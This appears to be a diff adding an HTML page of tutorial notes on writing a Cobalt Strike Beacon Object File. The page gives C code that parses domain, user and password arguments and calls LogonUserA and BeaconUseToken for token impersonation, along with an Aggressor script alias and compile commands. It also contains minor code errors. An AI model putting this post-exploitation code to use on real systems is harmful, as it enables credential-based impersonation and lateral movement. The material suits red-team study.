@@ -1,0 +1,195 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Data Parser API</title>
+</head><body><br/>
+<br/>
+<u><span style="font-size: 20pt">This is where we are able to actually input any value</span></u><br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><span style="font-size: 16pt"><li style="list-style-type: none">When you send arguments to BOF, especially packed arguments, they'll be made available here:</li>
+</span></ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><b><span style="font-size: 16pt">In the function prototype</span></b></li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none"><i><span style="font-size: 14pt">a pointer to a character buffer and a length value</span></i></li>
+</ul>
+</li>
+<li style="list-style-type: none"><img src="image 4.png"/></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<br/>
+<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><span style="font-size: 16pt">How to parse out the arguments from .cna file</span></li>
+</ul>
+</li>
+</ul>
+<br/>
+<img src="image 2.png"/><br/>
+<br/>
+<br/>
+<span style="font-size: 20pt"><b><u>Parsing the arguments using the internal API</u></b></span><ul><li style="list-style-type: none"><span style="font-size: 18pt"><b>highly recommended to use</b></span></li>
+</ul>
+<br/>
+<img height="325" src="image.png" width="500"/><br/>
+<br/>
+<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"/>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<span style="color: #00007f"><span style="font-size: 16pt">new code color</span></span><br/>
+<span style="font-size: 14pt"><span style="color: #000000">===================================================<br/>
+<span style="font-family: Rockwell">#include &lt;windows.h&gt;                           <br/>
+#include &quot;beacon.h&quot;                           <br/>
+<br/>
+WINADVAPI		WINBOOL  	WINAPI ADVAPI32$LogonUserA (LPCSTR lpszUsername,LPCSTR lpszDomain, LPCSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken);<br/>
+WINBASEAPI 	WINBOOL 	WINAPI KERNEL32$GetLastError (VOID);<br/>
+WINBASEAPI 	DWORD		WINAPI KERNEL32$CloseHandle (HANDLE hObject);<br/>
+<br/>
+void go(char * buff, int len) {</span></span><span style="font-family: Rockwell"><ul><span style="color: #000000"><li style="list-style-type: none">HANDLE hToken;			</li>
+</span><span style="color: #00007f"><li style="list-style-type: none">dataap parser;</li>
+<li style="list-style-type: none">char * domain;</li>
+<li style="list-style-type: none">char * user;</li>
+<li style="list-style-type: none">char * pass;</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none">BeaconDataParse(&amp;parser, buff, len);</li>
+</span><li style="list-style-type: none"><span style="color: #00007f">domain 	= BeaconDataExtract(&amp;parser, NULL);</span></li>
+<li style="list-style-type: none"><span style="color: #00007f">user 	= BeaconDataExtract(&amp;parser, NULL);</span></li>
+<li style="list-style-type: none"><span style="color: #00007f">pass 	= BeaconDataExtract(&amp;parser, NULL);</span><span style="color: #000000"/></li>
+</ul>
+<span style="color: #000000"><br/>
+</span><ul><span style="color: #000000"><li style="list-style-type: none">if (!BeaconIsAdmin())	{</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">BeaconPrintf(CALLBACK_ERROR, &quot;You must be admin to use this!&quot;);</li>
+<li style="list-style-type: none">return;</li>
+</ul>
+</li>
+<li style="list-style-type: none">}	</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none"/>
+</ul>
+</li>
+</span><li style="list-style-type: none"><span style="color: #000000">if (ADVAPI32$LogonUserA(</span><b><span style="color: #00007f">user</span></b><span style="color: #000000">, </span><b><span style="color: #00007f">domain</span></b><span style="color: #000000">, </span><b><span style="color: #00007f">pass</span></b><span style="color: #000000">, LOGON_32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &amp;hToken)) {</span></li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><span style="color: #000000"><li style="list-style-type: none">BeaconUseToken(hToken);  					// BeaconUseToken will print a message on success, so we can remove the BeaconPrintf</li>
+<li style="list-style-type: none">KERNEL32$CloseHandle(hToken);  </li>
+</span></ul>
+</li>
+<span style="color: #000000"><li style="list-style-type: none">}</li>
+<li style="list-style-type: none">else {</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">BeaconPrintf(CALLBACK_ERROR, &quot;Failure: %d&quot;, KERNEL32$GetLastError());					</li>
+</ul>
+</li>
+<li style="list-style-type: none">}</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none"/>
+</ul>
+</li>
+</span></ul>
+</li>
+</ul>
+<span style="color: #000000"><br/>
+</span></span><span style="color: #000000"><span style="font-family: Rockwell">}</span><br/>
+<br/>
+============================================================<br/>
+<ul><li style="list-style-type: none"><b>BeaconDataExtract</b>(pointerToParser, (optional)size of domain value)  	=  we put NULL because bof_pack terminated them for us</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">Function is also operating on the buffer and returning a pointer within it</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none"><i><span style="font-size: 12pt">you dont need to worry about freeing anything from the buffer because it is being managed by beacon in the background</span></i></li>
+</ul>
+</li>
+</ul>
+</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none"><b>datap parser;	 =	</b>this is on the stack and taken care of when the function exits</li>
+</ul>
+</span></span><span style="color: #000000"><ul><li style="list-style-type: none"><ul><span style="font-size: 14pt"><li style="list-style-type: none">The idea here is that we now have a </li>
+</span><li style="list-style-type: none"><ul><span style="font-size: 14pt"><i><li style="list-style-type: none">BOF file </li>
+<li style="list-style-type: none">a aggressor script</li>
+</i></span><span style="font-size: 20pt"><li style="list-style-type: none"/>
+</span></ul>
+</li>
+<span style="font-size: 20pt"><li style="list-style-type: none"><u><b>compile it</b></u></li>
+</span><li style="list-style-type: none"><ul><span style="font-size: 20pt"><li style="list-style-type: none">&gt; x86_64-w64mingw32-gcc -c luser.c -o luser.x64.o</li>
+<li style="list-style-type: none"/>
+</span><li style="list-style-type: none"><img height="212" src="image 5.png" width="800"/></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<span style="font-size: 14pt"><br/>
+<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><img src="image 3.png"/></li>
+</ul>
+</li>
+</ul>
+<br/>
+</span><span style="font-size: 12pt">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span><span style="font-size: 14pt"><br/>
+</span><ul><li style="list-style-type: none"><ul><span style="font-size: 20pt"><li style="list-style-type: none"><b><u>compile it as a 32 bit BOF</u></b></li>
+</span><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><span style="font-size: 18pt">use 32 bit compiler</span></li>
+</ul>
+</li>
+<span style="font-size: 20pt"><li style="list-style-type: none"/>
+</span></ul>
+</li>
+</ul>
+</li>
+</ul>
+<br/>
+<span style="font-size: 20pt">&gt; i686_w64-mingw32-gcc -c luser.c -o luser.x64.o</span><span style="font-size: 14pt"><br/>
+</span><span style="font-size: 14pt"/></span><span style="font-size: 14pt"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><span style="font-size: 18pt"><b><span style="color: #007f7f">query architecture of beacon file</span></b></span><span style="color: #000000"/></li>
+</ul>
+</li>
+</ul>
+<span style="color: #000000">============================================================<br/>
+# $1 = beacon ID                          <br/>
+# $2 = DOMAIN\user<br/>
+# $3 = password<br/>
+alias luser {</span><ul><li style="list-style-type: none"><span style="color: #000000">local('$handle $data $args $domain $user $pass </span><span style="color: #007f7f"><b>$arch</b></span><span style="color: #000000">');</span></li>
+<span style="color: #000000"><li style="list-style-type: none"/>
+<li style="list-style-type: none"># check our arguments</li>
+<li style="list-style-type: none">if (size(@_) != 3) {</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">berror($1, &quot;luser: not enough arguments&quot;);</li>
+<li style="list-style-type: none">return;</li>
+</ul>
+</li>
+<li style="list-style-type: none">}</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none">#parse our arguments</li>
+<li style="list-style-type: none">($domain, $user) = split('\\\\', $2);  		#need to escape twice</li>
+<li style="list-style-type: none">$pass           = $3;</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none"># read in our BOF file.....</li>
+</span><li style="list-style-type: none"><b><span style="color: #007f7f">$arch 	 =	barch($1);</span></b><span style="color: #000000"/></li>
+<li style="list-style-type: none"><span style="color: #000000">$handle	 = 	openf(script_resource(</span><b><span style="color: #007f7f">&quot;luser. $+ $arch $+ .o&quot;</span></b><span style="color: #000000">));</span></li>
+</ul>
+<span style="color: #000000"><ul>$data	 =	readb($handle, -1);</ul>
+<ul><li style="list-style-type: none">closef($handle);</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none"># pack our arguments using bof_pack, which accepts beacon id and format string</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none">$args = bof_pack($1, &quot;zzz&quot;, $domain, $user, $pass);</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none"># annouce to user...</li>
+<li style="list-style-type: none">btasks($1, &quot;create token as $2&quot;);</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none"># run a BOF</li>
+<li style="list-style-type: none">beacon_inline_execute($1, $data, &quot;go&quot;, $args);</li>
+</ul>
+}<br/>
+<br/>
+============================================================<br/>
+<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><b><span style="font-size: 18pt">Then reload script</span></b></li>
+</ul>
+</li>
+</ul>
+<br/>
+<img src="image 6.png"/><br/>
+<br/>
+<br/>
+<br/>
+</span></span></body></html>
